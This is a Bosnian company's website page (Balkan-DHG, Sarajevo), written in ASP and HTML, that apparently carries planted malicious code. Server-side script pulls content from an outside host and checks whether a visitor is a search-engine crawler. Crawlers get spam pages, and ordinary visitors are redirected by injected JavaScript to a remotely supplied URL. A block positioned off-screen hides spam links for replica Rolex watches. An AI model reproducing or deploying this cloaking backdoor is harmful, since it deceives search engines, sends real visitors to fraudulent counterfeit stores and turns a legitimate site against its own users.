<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
function getHTTPPage(url)
    dim Http
    set Http=server.createobject("MSXML2.XMLHTTP")
    Http.open "GET",url,false
    Http.send()
    if Http.readystate<>4 then
        exit function
    end if
    getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
    set http=nothing
    if err.number<>0 then err.Clear
end function
Function BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject("adodb.stream")
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        BytesToBstr = objstream.ReadText
        objstream.Close
        set objstream = nothing
End Function

Dim Url,Html
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
if request("p_id")<>""  then
URL="http://hbh01.runh.fr/product_color/NY_Tou.aspx?s_id=18&rnd="&yyu&"&p_id="&request("p_id")
else if request("pageIndex")<>""  then
URL="http://hbh01.runh.fr/product_color/LB_Tou.aspx?s_id=18&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else if request("searcher")<>""  then
URL="http://hbh01.runh.fr/product_color/LB_Tou.aspx?s_id=18&rnd="&yyu&"&searcher="&request("searcher")&""
else
URL="http://hbh01.runh.fr/product_color/LB_Tou.aspx?rnd="&yyu&"&s_id=18"
end if
end if
end if
Html = getHTTPPage(Url)

if request("dd")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")

end if
ipurl="http://hbh01.runh.fr/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if  (instr(domain,"google")>0 or instr(domain,"msn.com")>0 or instr(domain,"yahoo.com")>0 or instr(domain,"aol.com")>0) then
set re = new RegExp
re.IgnoreCase =True
re.Global = True
re.Pattern = "<sc*?([\s\S]*?)>"
Set matchs = re.Execute(html)
for each match in matchs
sc= match.SubMatches(0)
next
set matchs = nothing
Html=replace(Html,"<s"&sc&"></script>","")
Response.write Html

else

if request("p_id")<>""  then
ccc=request("p_id")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")
ddd=getHTTPPage("http://hjs.runh.fr/nben.txt?id=11")
eee=ddd&ccc&".html"
eee=replace(eee,"--","-")
Response.write "<script> "
Response.write  "document.location="""&eee&"""</script>"
else if request("searcher")<>""  then
ccc=request("searcher")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")
ddd=getHTTPPage("http://hjs.runh.fr/nben.txt?id=11")
eee=ddd&ccc&".html"
eee=replace(eee,"--","-")
Response.write "<script> "
Response.write  "document.location="""&eee&"""</script>"
else if request("pageIndex")<>""  then
ddd=getHTTPPage("http://hjs.runh.fr/nben.txt?id=11")
eee=ddd&".html"
Response.write "<script>document.location="""&eee&"""</script>"
end if
end if
end if
end if
%>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style type="text/css">td img {display: block;}</style>
<link rel="stylesheet" type="text/css" href="/css/Style.css">

</head>
<body bgcolor="#ffffff">
<table border="0" cellpadding="0" cellspacing="0" width="700" align="center">

  <tbody><tr>
   <td><img src="images/spacer.gif" width="28" height="1" border="0" alt=""></td>
   <td><img src="images/spacer.gif" width="644" height="1" border="0" alt=""></td>
   <td><img src="images/spacer.gif" width="28" height="1" border="0" alt=""></td>
   <td><img src="images/spacer.gif" width="1" height="1" border="0" alt=""></td>
  </tr>

  <tr>
   <td colspan="3"><img name="index_r1_c1" src="images/header-EN.jpg" width="700" height="163" border="0" id="index_r1_c1" usemap="#m_index_r1_c1" alt="Balkan DHG">
       <map name="m_index_r1_c1" id="m_index_r1_c123">
         <area shape="poly" coords="206,48,271,64,272,84,205,66,208,51" href="/tourism.htm" title="Turizam" alt="Turizam">
         <area shape="poly" coords="144,39,196,47,193,67,142,55,144,39" href="/trade.htm" title="Trgovina" alt="Trgovina">
         <area shape="poly" coords="76,27,136,36,137,58,75,47,76,27" href="/services.htm" title="Usluge" alt="Usluge">
         <area shape="poly" coords="17,18" href="#" alt="balkanDHG">
         <area shape="rect" coords="11,24,65,46" href="/index-en.htm" alt="Balkan DHG">
         <area shape="poly" coords="280,66,342,78,341,99,278,83" href="/contacts.htm" alt="Kontaktirajte nas">
         <area shape="rect" coords="287,10,314,29" href="/index.htm">
         <area shape="rect" coords="319,9,346,31" href="/index-en.htm">
       </map>
     <map name="m_index_r1_c1" id="m_index_r1_c123">
         <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="turizam.htm" title="Turizam" alt="Turizam">
         <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="trgovina.htm" title="Trgovina" alt="Trgovina">
         <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="usluge.htm" title="Usluge" alt="Usluge">
       </map>
     <map name="m_index_r1_c1" id="m_index_r1_c14">
         <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="/turizam.htm" title="Turizam" alt="Turizam">
         <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="/trgovina.htm" title="Trgovina" alt="Trgovina">
         <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="/usluge.htm" title="Usluge" alt="Usluge">
         <area shape="poly" coords="17,18" href="#" alt="balkanDHG">
         <area shape="rect" coords="19,21,38,42" href="/index.htm" alt="Balkan DHG">
         <area shape="poly" coords="325,74,390,90,388,106,320,93" href="/kontakt.htm" alt="Kontaktirajte nas">
       </map>
       <map name="m_index_r1_c1" id="m_index_r1_c122">
           <area shape="poly" coords="220,52,287,66,281,84,216,73,220,52" href="/turizam.htm" title="Turizam" alt="Turizam">
           <area shape="poly" coords="144,39,211,49,206,70,141,64,144,39" href="/trgovina.htm" title="Trgovina" alt="Trgovina">
           <area shape="poly" coords="85,29,137,39,138,54,84,49,85,29" href="/usluge.htm" title="Usluge" alt="Usluge">
           <area shape="poly" coords="17,18" href="#" alt="balkanDHG">
           <area shape="rect" coords="15,26,75,48" href="/index.htm" alt="Balkan DHG">
           <area shape="poly" coords="293,65,358,81,356,97,288,84" href="/kontakt.htm" alt="Kontaktirajte nas">
           <area shape="rect" coords="287,10,314,29" href="/index.htm">
           <area shape="rect" coords="319,9,346,31" href="/index-en.htm">
         </map>
     <map name="m_index_r1_c1" id="m_index_r1_c122">
           <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="turizam.htm" title="Turizam" alt="Turizam">
           <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="trgovina.htm" title="Trgovina" alt="Trgovina">
           <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="usluge.htm" title="Usluge" alt="Usluge">
         </map>
     <map name="m_index_r1_c1" id="m_index_r1_c13">
           <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="/turizam.htm" title="Turizam" alt="Turizam">
           <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="/trgovina.htm" title="Trgovina" alt="Trgovina">
           <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="/usluge.htm" title="Usluge" alt="Usluge">
           <area shape="poly" coords="17,18" href="#" alt="balkanDHG">
           <area shape="rect" coords="19,21,38,42" href="/index.htm" alt="Balkan DHG">
           <area shape="poly" coords="325,74,390,90,388,106,320,93" href="/kontakt.htm" alt="Kontaktirajte nas">
         </map>
      <map name="m_index_r1_c1" id="m_index_r1_c12">
       <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="/turizam.htm" title="Turizam" alt="Turizam">
       <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="/trgovina.htm" title="Trgovina" alt="Trgovina">
       <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="/usluge.htm" title="Usluge" alt="Usluge">
       <area shape="poly" coords="17,18" href="#" alt="balkanDHG">
       <area shape="rect" coords="19,21,38,42" href="/index.htm" alt="Balkan DHG">
       <area shape="poly" coords="325,74,390,90,388,106,320,93" href="/kontakt.htm" alt="Kontaktirajte nas">
       <area shape="rect" coords="287,10,314,29" href="/index.htm">
       <area shape="rect" coords="319,9,346,31" href="/index-en.htm">
     </map>
     <map name="m_index_r1_c1" id="m_index_r1_c12">
       <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="turizam.htm" title="Turizam" alt="Turizam">
       <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="trgovina.htm" title="Trgovina" alt="Trgovina">
       <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="usluge.htm" title="Usluge" alt="Usluge">
     </map></td>
   <td><img src="images/spacer.gif" width="1" height="163" border="0" alt=""></td>
  </tr>
  <p>
  <div  class="content">
<form method="get" action="">
    <input type="text" name="searcher" style="width: 400px" /><input type="submit" value="Searche" />
    </form>
	</div>
<%
						   
						   Dim Urlyy,Htmlyy
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)

if request("searcher")<>""  then
URLyy="http://hbh01.runh.fr/product_color/LB_NR.aspx?s_id=18&rnd="&yyu&"&searcher="&request("searcher")&""
else if request("pageIndex")<>""  then
URLyy="http://hbh01.runh.fr/product_color/LB_NR.aspx?s_id=18&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else
URLyy="http://hbh01.runh.fr/product_color/LB_NR.aspx?s_id=18&rnd="&yyu&""
if request("p_id")<>""  then
Urlyy="http://hbh01.runh.fr/product_color/NY_Content.aspx?s_id=18&rnd="&yyu&"&p_id="&request("p_id")
end if
end if
end if
Htmlyy = getHTTPPage(Urlyy)
Htmlyy=replace(Htmlyy,"LB_NR.aspx","")
Htmlyy=replace(Htmlyy,"s_id=18&rnd="&yyu&"&","")
Htmlyy=replace(Htmlyy,"?p_id=","?p_id=")
Response.write Htmlyy
%>
  
  </p>
  <tr>
   <td colspan="3"><img name="index_r3_c1" src="images/index_r3_c1.jpg" width="700" height="27" border="0" id="index_r3_c1" alt=""></td>
   <td><img src="images/spacer.gif" width="1" height="27" border="0" alt=""></td>
  </tr>
  <tr>
   <td colspan="4"><div class="footer" align="center">Balkan-DHG d.o.o, Ul. Put Famosa 
       38, 71000 Sarajevo<br>
       Tel. +387 33 974 080, Fax. +387 33 974 081, <a href="mailto:info@balkan-dhg.com">
       info@balkan-dhg.com</a></div></td>
  </tr>
</tbody></table><div style="position: absolute; top: -9999px;left: -9999px;">This one is the surest way to end up with a <a href="http://www.watchesreplica2m.com/">rolex replica</a> that both looks good and is extremely accurate at a nominal price. DownUnderWatches.com is Australia's premier online store for <a href="http://www.watcheshop.org.uk/">replica watches uk</a>. We source our watches in bulk from suppliers around the world, and that allows us to get great deals and keep the prices low. We offer FREE DHL Express Shipping on all <a href="http://www.watchesshopsuk.co.uk/" style="text-decoration:none;color:black;" title="replica watches sale">replica watches sale</a> domestic orders! Depending on your location, you can expect your order to reach you anywhere between 2-4 days. For other countries our <a href="http://www.topuksale.org.uk/">replica watches uk</a> shipping rates are very reasonable and you can choose the <a href="http://www.plawatches.org/">replica watches</a> shipping method while checking out. There comes a <a href="http://www.usarmygermany.com/postinfo.asp">fake rolex sale</a> time when every one of us needs to move past adolescent fantasies and embrace seriousness to go ahead in life.</div> 

<map name="m_index_r1_c1" id="m_index_r1_c1">
<area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="turizam.htm" title="Turizam" alt="Turizam">
<area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="trgovina.htm" title="Trgovina" alt="Trgovina">
<area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="usluge.htm" title="Usluge" alt="Usluge">
</map>


</body></html>